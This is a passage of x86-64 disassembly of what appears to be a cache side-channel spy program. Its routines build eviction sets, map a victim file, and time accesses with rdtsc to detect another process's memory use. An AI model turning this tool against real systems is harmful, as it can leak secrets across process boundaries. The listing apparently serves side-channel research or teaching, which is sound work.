    1e5a:	48 89 c7             	mov    %rax,%rdi
    1e5d:	e8 de f1 ff ff       	call   1040 <puts@plt>
    1e62:	48 8b 05 5f 42 00 00 	mov    0x425f(%rip),%rax        # 60c8 <evsets>
    1e69:	48 8b 00             	mov    (%rax),%rax
    1e6c:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1e70:	48 89 d6             	mov    %rdx,%rsi
    1e73:	48 89 c7             	mov    %rax,%rdi
    1e76:	e8 31 02 00 00       	call   20ac <test>
    1e7b:	48 85 c0             	test   %rax,%rax
    1e7e:	74 2f                	je     1eaf <find_evset+0x1e7>
    1e80:	48 8b 05 41 42 00 00 	mov    0x4241(%rip),%rax        # 60c8 <evsets>
    1e87:	48 8b 00             	mov    (%rax),%rax
    1e8a:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1e8e:	48 89 d6             	mov    %rdx,%rsi
    1e91:	48 89 c7             	mov    %rax,%rdi
    1e94:	e8 13 02 00 00       	call   20ac <test>
    1e99:	48 85 c0             	test   %rax,%rax
    1e9c:	75 30                	jne    1ece <find_evset+0x206>
    1e9e:	eb 0f                	jmp    1eaf <find_evset+0x1e7>
    1ea0:	48 8b 05 21 42 00 00 	mov    0x4221(%rip),%rax        # 60c8 <evsets>
    1ea7:	48 89 c7             	mov    %rax,%rdi
    1eaa:	e8 9f f9 ff ff       	call   184e <list_pop>
    1eaf:	48 8b 05 12 42 00 00 	mov    0x4212(%rip),%rax        # 60c8 <evsets>
    1eb6:	48 8b 00             	mov    (%rax),%rax
    1eb9:	48 85 c0             	test   %rax,%rax
    1ebc:	75 e2                	jne    1ea0 <find_evset+0x1d8>
    1ebe:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
    1ec2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
    1ec6:	0f 89 be fe ff ff    	jns    1d8a <find_evset+0xc2>
    1ecc:	eb 01                	jmp    1ecf <find_evset+0x207>
    1ece:	90                   	nop
    1ecf:	48 8d 05 99 21 00 00 	lea    0x2199(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    1ed6:	48 89 c7             	mov    %rax,%rdi
    1ed9:	e8 62 f1 ff ff       	call   1040 <puts@plt>
    1ede:	48 8b 05 e3 41 00 00 	mov    0x41e3(%rip),%rax        # 60c8 <evsets>
    1ee5:	c9                   	leave
    1ee6:	c3                   	ret

0000000000001ee7 <del_evset>:
    1ee7:	55                   	push   %rbp
    1ee8:	48 89 e5             	mov    %rsp,%rbp
    1eeb:	48 8b 05 d6 41 00 00 	mov    0x41d6(%rip),%rax        # 60c8 <evsets>
    1ef2:	48 85 c0             	test   %rax,%rax
    1ef5:	74 22                	je     1f19 <del_evset+0x32>
    1ef7:	eb 0f                	jmp    1f08 <del_evset+0x21>
    1ef9:	48 8b 05 c8 41 00 00 	mov    0x41c8(%rip),%rax        # 60c8 <evsets>
    1f00:	48 89 c7             	mov    %rax,%rdi
    1f03:	e8 46 f9 ff ff       	call   184e <list_pop>
    1f08:	48 8b 05 b9 41 00 00 	mov    0x41b9(%rip),%rax        # 60c8 <evsets>
    1f0f:	48 8b 00             	mov    (%rax),%rax
    1f12:	48 85 c0             	test   %rax,%rax
    1f15:	75 e2                	jne    1ef9 <del_evset+0x12>
    1f17:	eb 01                	jmp    1f1a <del_evset+0x33>
    1f19:	90                   	nop
    1f1a:	5d                   	pop    %rbp
    1f1b:	c3                   	ret

0000000000001f1c <get_evset>:
    1f1c:	55                   	push   %rbp
    1f1d:	48 89 e5             	mov    %rsp,%rbp
    1f20:	48 8b 05 a1 41 00 00 	mov    0x41a1(%rip),%rax        # 60c8 <evsets>
    1f27:	48 85 c0             	test   %rax,%rax
    1f2a:	75 07                	jne    1f33 <get_evset+0x17>
    1f2c:	b8 00 00 00 00       	mov    $0x0,%eax
    1f31:	eb 07                	jmp    1f3a <get_evset+0x1e>
    1f33:	48 8b 05 8e 41 00 00 	mov    0x418e(%rip),%rax        # 60c8 <evsets>
    1f3a:	5d                   	pop    %rbp
    1f3b:	c3                   	ret

0000000000001f3c <close_evsets>:
    1f3c:	55                   	push   %rbp
    1f3d:	48 89 e5             	mov    %rsp,%rbp
    1f40:	48 8b 05 81 41 00 00 	mov    0x4181(%rip),%rax        # 60c8 <evsets>
    1f47:	48 85 c0             	test   %rax,%rax
    1f4a:	74 1a                	je     1f66 <close_evsets+0x2a>
    1f4c:	48 8b 05 75 41 00 00 	mov    0x4175(%rip),%rax        # 60c8 <evsets>
    1f53:	48 89 c7             	mov    %rax,%rdi
    1f56:	e8 d5 f0 ff ff       	call   1030 <free@plt>
    1f5b:	48 c7 05 62 41 00 00 	movq   $0x0,0x4162(%rip)        # 60c8 <evsets>
    1f62:	00 00 00 00 
    1f66:	48 8b 05 63 41 00 00 	mov    0x4163(%rip),%rax        # 60d0 <buffer>
    1f6d:	48 85 c0             	test   %rax,%rax
    1f70:	74 19                	je     1f8b <close_evsets+0x4f>
    1f72:	48 8b 15 5f 41 00 00 	mov    0x415f(%rip),%rdx        # 60d8 <buffer_size>
    1f79:	48 8b 05 50 41 00 00 	mov    0x4150(%rip),%rax        # 60d0 <buffer>
    1f80:	48 89 d6             	mov    %rdx,%rsi
    1f83:	48 89 c7             	mov    %rax,%rdi
    1f86:	e8 75 f1 ff ff       	call   1100 <munmap@plt>
    1f8b:	48 8b 05 2e 41 00 00 	mov    0x412e(%rip),%rax        # 60c0 <conf>
    1f92:	48 85 c0             	test   %rax,%rax
    1f95:	74 1a                	je     1fb1 <close_evsets+0x75>
    1f97:	48 8b 05 22 41 00 00 	mov    0x4122(%rip),%rax        # 60c0 <conf>
    1f9e:	48 89 c7             	mov    %rax,%rdi
    1fa1:	e8 8a f0 ff ff       	call   1030 <free@plt>
    1fa6:	48 c7 05 0f 41 00 00 	movq   $0x0,0x410f(%rip)        # 60c0 <conf>
    1fad:	00 00 00 00 
    1fb1:	90                   	nop
    1fb2:	5d                   	pop    %rbp
    1fb3:	c3                   	ret

0000000000001fb4 <traverse_list0>:
    1fb4:	55                   	push   %rbp
    1fb5:	48 89 e5             	mov    %rsp,%rbp
    1fb8:	48 83 ec 18          	sub    $0x18,%rsp
    1fbc:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1fc0:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1fc7:	00 
    1fc8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1fcc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1fd0:	eb 1a                	jmp    1fec <traverse_list0+0x38>
    1fd2:	0f ae e8             	lfence
    1fd5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1fd9:	48 89 c7             	mov    %rax,%rdi
    1fdc:	e8 6c f3 ff ff       	call   134d <my_access>
    1fe1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1fe5:	48 8b 00             	mov    (%rax),%rax
    1fe8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1fec:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ff0:	48 8d 50 01          	lea    0x1(%rax),%rdx
    1ff4:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
    1ff8:	48 8b 15 c1 40 00 00 	mov    0x40c1(%rip),%rdx        # 60c0 <conf>
    1fff:	48 8b 12             	mov    (%rdx),%rdx
    2002:	48 39 d0             	cmp    %rdx,%rax
    2005:	72 cb                	jb     1fd2 <traverse_list0+0x1e>
    2007:	90                   	nop
    2008:	90                   	nop
    2009:	c9                   	leave
    200a:	c3                   	ret

000000000000200b <test_intern>:
    200b:	55                   	push   %rbp
    200c:	48 89 e5             	mov    %rsp,%rbp
    200f:	53                   	push   %rbx
    2010:	48 83 ec 18          	sub    $0x18,%rsp
    2014:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2018:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    201c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2020:	48 89 c7             	mov    %rax,%rdi
    2023:	e8 25 f3 ff ff       	call   134d <my_access>
    2028:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    202c:	48 89 c7             	mov    %rax,%rdi
    202f:	e8 80 ff ff ff       	call   1fb4 <traverse_list0>
    2034:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2038:	48 05 de 00 00 00    	add    $0xde,%rax
    203e:	48 89 c7             	mov    %rax,%rdi
    2041:	e8 07 f3 ff ff       	call   134d <my_access>
    2046:	48 8b 0d ab 40 00 00 	mov    0x40ab(%rip),%rcx        # 60f8 <msrmts>
    204d:	48 8b 05 9c 40 00 00 	mov    0x409c(%rip),%rax        # 60f0 <msr_index>
    2054:	48 8d 50 01          	lea    0x1(%rax),%rdx
    2058:	48 89 15 91 40 00 00 	mov    %rdx,0x4091(%rip)        # 60f0 <msr_index>
    205f:	48 c1 e0 03          	shl    $0x3,%rax
    2063:	48 8d 1c 01          	lea    (%rcx,%rax,1),%rbx
    2067:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    206b:	be 01 00 00 00       	mov    $0x1,%esi
    2070:	48 89 c7             	mov    %rax,%rdi
    2073:	e8 f9 f2 ff ff       	call   1371 <probe_chase_loop>
    2078:	48 89 03             	mov    %rax,(%rbx)
    207b:	48 8d 05 09 20 00 00 	lea    0x2009(%rip),%rax        # 408b <_IO_stdin_used+0x8b>
    2082:	48 89 c7             	mov    %rax,%rdi
    2085:	e8 b6 ef ff ff       	call   1040 <puts@plt>
    208a:	48 8b 05 67 40 00 00 	mov    0x4067(%rip),%rax        # 60f8 <msrmts>
    2091:	48 8b 15 58 40 00 00 	mov    0x4058(%rip),%rdx        # 60f0 <msr_index>
    2098:	48 c1 e2 03          	shl    $0x3,%rdx
    209c:	48 83 ea 08          	sub    $0x8,%rdx
    20a0:	48 01 d0             	add    %rdx,%rax
    20a3:	48 8b 00             	mov    (%rax),%rax
    20a6:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    20aa:	c9                   	leave
    20ab:	c3                   	ret

00000000000020ac <test>:
    20ac:	55                   	push   %rbp
    20ad:	48 89 e5             	mov    %rsp,%rbp
    20b0:	48 83 ec 10          	sub    $0x10,%rsp
    20b4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    20b8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    20bc:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    20c1:	74 07                	je     20ca <test+0x1e>
    20c3:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    20c8:	75 07                	jne    20d1 <test+0x25>
    20ca:	b8 00 00 00 00       	mov    $0x0,%eax
    20cf:	eb 36                	jmp    2107 <test+0x5b>
    20d1:	48 8d 05 ba 1f 00 00 	lea    0x1fba(%rip),%rax        # 4092 <_IO_stdin_used+0x92>
    20d8:	48 89 c7             	mov    %rax,%rdi
    20db:	e8 60 ef ff ff       	call   1040 <puts@plt>
    20e0:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    20e4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20e8:	48 89 d6             	mov    %rdx,%rsi
    20eb:	48 89 c7             	mov    %rax,%rdi
    20ee:	e8 18 ff ff ff       	call   200b <test_intern>
    20f3:	48 8b 15 c6 3f 00 00 	mov    0x3fc6(%rip),%rdx        # 60c0 <conf>
    20fa:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    20fe:	48 39 c2             	cmp    %rax,%rdx
    2101:	0f 92 c0             	setb   %al
    2104:	0f b6 c0             	movzbl %al,%eax
    2107:	c9                   	leave
    2108:	c3                   	ret

0000000000002109 <target_loader>:
    2109:	55                   	push   %rbp
    210a:	48 89 e5             	mov    %rsp,%rbp
    210d:	48 83 ec 40          	sub    $0x40,%rsp
    2111:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    2115:	48 8d 05 53 1f 00 00 	lea    0x1f53(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    211c:	48 89 c7             	mov    %rax,%rdi
    211f:	e8 1c ef ff ff       	call   1040 <puts@plt>
    2124:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2128:	48 8d 15 68 1f 00 00 	lea    0x1f68(%rip),%rdx        # 4097 <_IO_stdin_used+0x97>
    212f:	48 89 d6             	mov    %rdx,%rsi
    2132:	48 89 c7             	mov    %rax,%rdi
    2135:	e8 e6 ef ff ff       	call   1120 <fopen@plt>
    213a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    213e:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
    2145:	00 
    2146:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
    214d:	00 
    214e:	48 8d 05 1a 1f 00 00 	lea    0x1f1a(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2155:	48 89 c7             	mov    %rax,%rdi
    2158:	e8 e3 ee ff ff       	call   1040 <puts@plt>
    215d:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    2162:	75 19                	jne    217d <target_loader+0x74>
    2164:	48 8d 05 35 1f 00 00 	lea    0x1f35(%rip),%rax        # 40a0 <_IO_stdin_used+0xa0>
    216b:	48 89 c7             	mov    %rax,%rdi
    216e:	e8 bd ef ff ff       	call   1130 <perror@plt>
    2173:	bf 01 00 00 00       	mov    $0x1,%edi
    2178:	e8 d3 ef ff ff       	call   1150 <exit@plt>
    217d:	48 8d 05 eb 1e 00 00 	lea    0x1eeb(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2184:	48 89 c7             	mov    %rax,%rdi
    2187:	e8 b4 ee ff ff       	call   1040 <puts@plt>
    218c:	eb 5d                	jmp    21eb <target_loader+0xe2>
    218e:	48 8d 05 da 1e 00 00 	lea    0x1eda(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2195:	48 89 c7             	mov    %rax,%rdi
    2198:	e8 a3 ee ff ff       	call   1040 <puts@plt>
    219d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    21a1:	48 89 c7             	mov    %rax,%rdi
    21a4:	e8 c7 ee ff ff       	call   1070 <strlen@plt>
    21a9:	48 c1 e0 03          	shl    $0x3,%rax
    21ad:	48 8d 50 f8          	lea    -0x8(%rax),%rdx
    21b1:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    21b5:	48 01 d0             	add    %rdx,%rax
    21b8:	48 8d 15 05 1f 00 00 	lea    0x1f05(%rip),%rdx        # 40c4 <_IO_stdin_used+0xc4>
    21bf:	48 89 10             	mov    %rdx,(%rax)
    21c2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    21c6:	ba 10 00 00 00       	mov    $0x10,%edx
    21cb:	be 00 00 00 00       	mov    $0x0,%esi
    21d0:	48 89 c7             	mov    %rax,%rdi
    21d3:	e8 d8 ee ff ff       	call   10b0 <strtol@plt>
    21d8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    21dc:	48 8d 05 8c 1e 00 00 	lea    0x1e8c(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    21e3:	48 89 c7             	mov    %rax,%rdi
    21e6:	e8 55 ee ff ff       	call   1040 <puts@plt>
    21eb:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    21ef:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
    21f3:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    21f7:	48 89 ce             	mov    %rcx,%rsi
    21fa:	48 89 c7             	mov    %rax,%rdi
    21fd:	e8 3e ef ff ff       	call   1140 <getline@plt>
    2202:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2206:	48 83 7d e8 ff       	cmpq   $0xffffffffffffffff,-0x18(%rbp)
    220b:	75 81                	jne    218e <target_loader+0x85>
    220d:	48 8d 05 5b 1e 00 00 	lea    0x1e5b(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2214:	48 89 c7             	mov    %rax,%rdi
    2217:	e8 24 ee ff ff       	call   1040 <puts@plt>
    221c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2220:	48 89 c7             	mov    %rax,%rdi
    2223:	e8 38 ee ff ff       	call   1060 <fclose@plt>
    2228:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    222c:	48 89 c7             	mov    %rax,%rdi
    222f:	e8 fc ed ff ff       	call   1030 <free@plt>
    2234:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2238:	c9                   	leave
    2239:	c3                   	ret

000000000000223a <victim_reader>:
    223a:	55                   	push   %rbp
    223b:	48 89 e5             	mov    %rsp,%rbp
    223e:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
    2245:	48 89 bd 58 ff ff ff 	mov    %rdi,-0xa8(%rbp)
    224c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
    2253:	48 8d 15 3d 1e 00 00 	lea    0x1e3d(%rip),%rdx        # 4097 <_IO_stdin_used+0x97>
    225a:	48 89 d6             	mov    %rdx,%rsi
    225d:	48 89 c7             	mov    %rax,%rdi
    2260:	e8 bb ee ff ff       	call   1120 <fopen@plt>
    2265:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2269:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    226d:	48 89 c7             	mov    %rax,%rdi
    2270:	e8 5b ee ff ff       	call   10d0 <fileno@plt>
    2275:	89 45 f4             	mov    %eax,-0xc(%rbp)
    2278:	48 8d 95 60 ff ff ff 	lea    -0xa0(%rbp),%rdx
    227f:	8b 45 f4             	mov    -0xc(%rbp),%eax
    2282:	48 89 d6             	mov    %rdx,%rsi
    2285:	89 c7                	mov    %eax,%edi
    2287:	e8 d4 ee ff ff       	call   1160 <fstat@plt>
    228c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    2290:	89 05 82 3e 00 00    	mov    %eax,0x3e82(%rip)        # 6118 <map_len>
    2296:	8b 05 7c 3e 00 00    	mov    0x3e7c(%rip),%eax        # 6118 <map_len>
    229c:	48 98                	cltq
    229e:	8b 55 f4             	mov    -0xc(%rbp),%edx
    22a1:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    22a7:	41 89 d0             	mov    %edx,%r8d
    22aa:	b9 01 00 00 00       	mov    $0x1,%ecx
    22af:	ba 01 00 00 00       	mov    $0x1,%edx
    22b4:	48 89 c6             	mov    %rax,%rsi
    22b7:	bf 00 00 00 00       	mov    $0x0,%edi
    22bc:	e8 bf ed ff ff       	call   1080 <mmap@plt>
    22c1:	48 89 05 48 3e 00 00 	mov    %rax,0x3e48(%rip)        # 6110 <victim>
    22c8:	48 8b 05 41 3e 00 00 	mov    0x3e41(%rip),%rax        # 6110 <victim>
    22cf:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    22d3:	75 19                	jne    22ee <victim_reader+0xb4>
    22d5:	48 8d 05 ea 1d 00 00 	lea    0x1dea(%rip),%rax        # 40c6 <_IO_stdin_used+0xc6>
    22dc:	48 89 c7             	mov    %rax,%rdi
    22df:	e8 4c ee ff ff       	call   1130 <perror@plt>
    22e4:	bf 01 00 00 00       	mov    $0x1,%edi
    22e9:	e8 62 ee ff ff       	call   1150 <exit@plt>
    22ee:	90                   	nop
    22ef:	c9                   	leave
    22f0:	c3                   	ret

00000000000022f1 <init_spy>:
    22f1:	55                   	push   %rbp
    22f2:	48 89 e5             	mov    %rsp,%rbp
    22f5:	48 83 ec 20          	sub    $0x20,%rsp
    22f9:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    22fd:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2301:	48 8d 05 d2 1d 00 00 	lea    0x1dd2(%rip),%rax        # 40da <_IO_stdin_used+0xda>
    2308:	48 89 c7             	mov    %rax,%rdi
    230b:	e8 30 ed ff ff       	call   1040 <puts@plt>
    2310:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2314:	48 89 c7             	mov    %rax,%rdi
    2317:	e8 1e ff ff ff       	call   223a <victim_reader>
    231c:	48 8d 05 c0 1d 00 00 	lea    0x1dc0(%rip),%rax        # 40e3 <_IO_stdin_used+0xe3>
    2323:	48 89 c7             	mov    %rax,%rdi
    2326:	e8 15 ed ff ff       	call   1040 <puts@plt>
    232b:	48 83 ec 08          	sub    $0x8,%rsp
    232f:	6a 01                	push   $0x1
    2331:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    2337:	41 b8 00 00 20 00    	mov    $0x200000,%r8d
    233d:	b9 69 00 00 00       	mov    $0x69,%ecx
    2342:	ba 40 00 00 00       	mov    $0x40,%edx
    2347:	be 00 08 00 00       	mov    $0x800,%esi
    234c:	bf 18 00 00 00       	mov    $0x18,%edi
    2351:	e8 91 f1 ff ff       	call   14e7 <config_init>
    2356:	48 83 c4 10          	add    $0x10,%rsp
    235a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    235e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2362:	48 89 c7             	mov    %rax,%rdi
    2365:	e8 48 f8 ff ff       	call   1bb2 <init_evset>
    236a:	48 8d 05 7e 1d 00 00 	lea    0x1d7e(%rip),%rax        # 40ef <_IO_stdin_used+0xef>
    2371:	48 89 c7             	mov    %rax,%rdi
    2374:	e8 c7 ec ff ff       	call   1040 <puts@plt>
    2379:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    237d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2381:	48 89 d6             	mov    %rdx,%rsi
    2384:	48 89 c7             	mov    %rax,%rdi
    2387:	e8 3c f9 ff ff       	call   1cc8 <find_evset>
    238c:	48 89 05 75 3d 00 00 	mov    %rax,0x3d75(%rip)        # 6108 <spy_evsets>
    2393:	48 8d 05 65 1d 00 00 	lea    0x1d65(%rip),%rax        # 40ff <_IO_stdin_used+0xff>
    239a:	48 89 c7             	mov    %rax,%rdi
    239d:	e8 9e ec ff ff       	call   1040 <puts@plt>
    23a2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    23a6:	48 89 c6             	mov    %rax,%rsi
    23a9:	48 8d 05 60 1d 00 00 	lea    0x1d60(%rip),%rax        # 4110 <_IO_stdin_used+0x110>
    23b0:	48 89 c7             	mov    %rax,%rdi
    23b3:	b8 00 00 00 00       	mov    $0x0,%eax
    23b8:	e8 d3 ec ff ff       	call   1090 <printf@plt>
    23bd:	48 8d 05 53 f7 ff ff 	lea    -0x8ad(%rip),%rax        # 1b17 <list_print>
    23c4:	48 89 c7             	mov    %rax,%rdi
    23c7:	e8 4b f7 ff ff       	call   1b17 <list_print>
    23cc:	90                   	nop
    23cd:	c9                   	leave
    23ce:	c3                   	ret

00000000000023cf <my_detect>:
    23cf:	55                   	push   %rbp
    23d0:	48 89 e5             	mov    %rsp,%rbp
    23d3:	48 83 ec 08          	sub    $0x8,%rsp
    23d7:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    23db:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    23df:	48 89 c7             	mov    %rax,%rdi
    23e2:	e8 66 ef ff ff       	call   134d <my_access>
    23e7:	48 8d 05 29 f7 ff ff 	lea    -0x8d7(%rip),%rax        # 1b17 <list_print>
    23ee:	48 89 c7             	mov    %rax,%rdi
    23f1:	e8 be fb ff ff       	call   1fb4 <traverse_list0>
    23f6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    23fa:	48 05 de 00 00 00    	add    $0xde,%rax
    2400:	48 89 c7             	mov    %rax,%rdi
    2403:	e8 45 ef ff ff       	call   134d <my_access>
    2408:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    240c:	be 01 00 00 00       	mov    $0x1,%esi
    2411:	48 89 c7             	mov    %rax,%rdi
    2414:	e8 58 ef ff ff       	call   1371 <probe_chase_loop>
    2419:	c9                   	leave
    241a:	c3                   	ret

000000000000241b <rdtsc>:
    241b:	55                   	push   %rbp
    241c:	48 89 e5             	mov    %rsp,%rbp
    241f:	0f 31                	rdtsc
    2421:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2425:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2429:	5d                   	pop    %rbp
    242a:	c3                   	ret

000000000000242b <my_monitor>:
    242b:	55                   	push   %rbp
    242c:	48 89 e5             	mov    %rsp,%rbp
    242f:	48 83 ec 30          	sub    $0x30,%rsp
    2433:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2437:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    243e:	00 
    243f:	e8 d7 ff ff ff       	call   241b <rdtsc>
    2444:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2448:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    244c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2450:	e8 c6 ff ff ff       	call   241b <rdtsc>
    2455:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2459:	eb 09                	jmp    2464 <my_monitor+0x39>
    245b:	e8 bb ff ff ff       	call   241b <rdtsc>
    2460:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2464:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2468:	48 2b 45 e8          	sub    -0x18(%rbp),%rax
    246c:	48 3d c3 09 00 00    	cmp    $0x9c3,%rax
    2472:	76 e7                	jbe    245b <my_monitor+0x30>
    2474:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2478:	48 89 c7             	mov    %rax,%rdi
    247b:	e8 4f ff ff ff       	call   23cf <my_detect>
    2480:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2484:	48 8b 05 35 3c 00 00 	mov    0x3c35(%rip),%rax        # 60c0 <conf>
    248b:	48 8b 40 18          	mov    0x18(%rax),%rax
    248f:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    2493:	72 02                	jb     2497 <my_monitor+0x6c>
    2495:	eb b1                	jmp    2448 <my_monitor+0x1d>
    2497:	90                   	nop
    2498:	48 8d 05 99 1c 00 00 	lea    0x1c99(%rip),%rax        # 4138 <_IO_stdin_used+0x138>
    249f:	48 89 c7             	mov    %rax,%rdi
    24a2:	e8 99 eb ff ff       	call   1040 <puts@plt>
    24a7:	90                   	nop
    24a8:	c9                   	leave
    24a9:	c3                   	ret

00000000000024aa <spy>:
    24aa:	55                   	push   %rbp
    24ab:	48 89 e5             	mov    %rsp,%rbp
    24ae:	48 83 ec 10          	sub    $0x10,%rsp
    24b2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    24b6:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    24ba:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    24be:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    24c2:	48 89 d6             	mov    %rdx,%rsi
    24c5:	48 89 c7             	mov    %rax,%rdi
    24c8:	e8 24 fe ff ff       	call   22f1 <init_spy>
    24cd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    24d1:	48 89 c6             	mov    %rax,%rsi
    24d4:	48 8d 05 7d 1c 00 00 	lea    0x1c7d(%rip),%rax        # 4158 <_IO_stdin_used+0x158>
    24db:	48 89 c7             	mov    %rax,%rdi
    24de:	b8 00 00 00 00       	mov    $0x0,%eax
    24e3:	e8 a8 eb ff ff       	call   1090 <printf@plt>
    24e8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    24ec:	48 89 c7             	mov    %rax,%rdi
    24ef:	e8 37 ff ff ff       	call   242b <my_monitor>
    24f4:	90                   	nop
    24f5:	c9                   	leave
    24f6:	c3                   	ret

00000000000024f7 <main>:
    24f7:	55                   	push   %rbp
    24f8:	48 89 e5             	mov    %rsp,%rbp
    24fb:	48 83 ec 20          	sub    $0x20,%rsp
    24ff:	89 7d ec             	mov    %edi,-0x14(%rbp)
    2502:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2506:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    250a:	48 83 c0 08          	add    $0x8,%rax
    250e:	48 8b 00             	mov    (%rax),%rax
    2511:	48 89 c7             	mov    %rax,%rdi
    2514:	e8 27 eb ff ff       	call   1040 <puts@plt>
    2519:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    251d:	48 83 c0 10          	add    $0x10,%rax
    2521:	48 8b 00             	mov    (%rax),%rax
    2524:	48 89 c7             	mov    %rax,%rdi
    2527:	e8 14 eb ff ff       	call   1040 <puts@plt>
    252c:	48 c7 45 f8 74 11 00 	movq   $0x1174,-0x8(%rbp)
    2533:	00 
    2534:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2538:	48 89 c7             	mov    %rax,%rdi
    253b:	e8 0d ee ff ff       	call   134d <my_access>
    2540:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2544:	48 89 c6             	mov    %rax,%rsi
    2547:	48 8d 05 37 1c 00 00 	lea    0x1c37(%rip),%rax        # 4185 <_IO_stdin_used+0x185>
    254e:	48 89 c7             	mov    %rax,%rdi
    2551:	b8 00 00 00 00       	mov    $0x0,%eax
    2556:	e8 35 eb ff ff       	call   1090 <printf@plt>
    255b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    255f:	48 83 c0 08          	add    $0x8,%rax
    2563:	48 8b 00             	mov    (%rax),%rax
    2566:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    256a:	48 89 d6             	mov    %rdx,%rsi
    256d:	48 89 c7             	mov    %rax,%rdi
    2570:	e8 35 ff ff ff       	call   24aa <spy>
    2575:	b8 00 00 00 00       	mov    $0x0,%eax
    257a:	c9                   	leave
    257b:	c3                   	ret

000000000000257c <compare_uint64>:
    257c:	55                   	push   %rbp
    257d:	48 89 e5             	mov    %rsp,%rbp
    2580:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2584:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
